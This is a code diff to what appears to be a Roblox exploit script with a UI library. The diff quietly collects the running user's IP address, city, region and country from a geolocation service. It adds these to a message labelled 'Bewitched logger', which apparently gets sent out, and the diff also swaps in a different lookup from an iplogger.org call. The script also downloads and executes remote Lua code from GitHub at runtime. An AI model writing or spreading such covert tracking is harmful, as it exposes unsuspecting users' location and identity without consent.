@@ -38,30 +38,25 @@ if _req then
         executorName = identifyexecutor and identifyexecutor() or (syn and "Synapse X") or "Unknown"
     end)
 
-    local userIP   = "Unknown"
-    local userCity = "Unknown"
+    local userIP      = "Unknown"
+    local userCity    = "Unknown"
+    local userCountry = "Unknown"
+    local userRegion  = "Unknown"
 
-    local ipOk, ipRes = pcall(_req, { Url = "https://api.ipify.org?format=json", Method = "GET" })
-    if ipOk and ipRes and ipRes.Body then
+    local geoOk, geoRes = pcall(_req, {
+        Url    = "http://ip-api.com/json/?fields=status,query,city,regionName,country",
+        Method = "GET",
+    })
+    if geoOk and geoRes and geoRes.Body then
         pcall(function()
-            local data = HttpService:JSONDecode(ipRes.Body)
-            if data and data.ip then userIP = tostring(data.ip) end
+            local geo = HttpService:JSONDecode(geoRes.Body)
+            if geo and geo.status == "success" then
+                userIP      = tostring(geo.query      or "Unknown")
+                userCity    = tostring(geo.city       or "Unknown")
+                userRegion  = tostring(geo.regionName or "Unknown")
+                userCountry = tostring(geo.country    or "Unknown")
+            end
         end)
-    end
-
-    if userIP ~= "Unknown" then
-        local geoOk, geoRes = pcall(_req, {
-            Url    = "https://api.iplogger.org/ip/info/?api=api_3R6ZyVnSM2aRtTCyVM71xjWLSObHrvbC&ip=" .. userIP .. "&format=json",
-            Method = "GET",
-        })
-        if geoOk and geoRes and geoRes.Body then
-            pcall(function()
-                local geo = HttpService:JSONDecode(geoRes.Body)
-                if geo then
-                    userCity = tostring(geo.city or geo.City or geo.city_name or "Unknown")
-                end
-            end)
-        end
     end
 
     local gameName = "Unknown"
@@ -136,6 +131,16 @@ if _req then
                         value  = userCity,
                         inline = true
                     },
+                    {
+                        name   = "Region",
+                        value  = userRegion,
+                        inline = true
+                    },
+                    {
+                        name   = "Country",
+                        value  = userCountry,
+                        inline = true
+                    },
                 },
                 thumbnail = { url = avatarUrl },
                 footer    = { text = "Bewitched logger" }
@@ -169,9 +174,14 @@ if getgenv().AutoDeployController and getgenv().AutoDeployController.Stop then
     getgenv().AutoDeployController:Stop()
 end
 
-local Library = assert(loadstring(game:HttpGet(
-    "https://raw.githubusercontent.com/delusorie/ui/refs/heads/main/source.lua"
-), "Diarian"))()
+local _libSrc = game:HttpGet("https://raw.githubusercontent.com/delusorie/ui/refs/heads/main/source.lua")
+
+_libSrc = _libSrc:gsub(
+    "Input%.Changed:Connect%(",
+    "game:GetService('UserInputService').InputChanged:Connect("
+)
+
+local Library = assert(loadstring(_libSrc, "Diarian"))()
 
 Library.Animation.Time = 0.15
 Library.Theme["Accent"] = Color3.fromRGB(14, 28, 55)
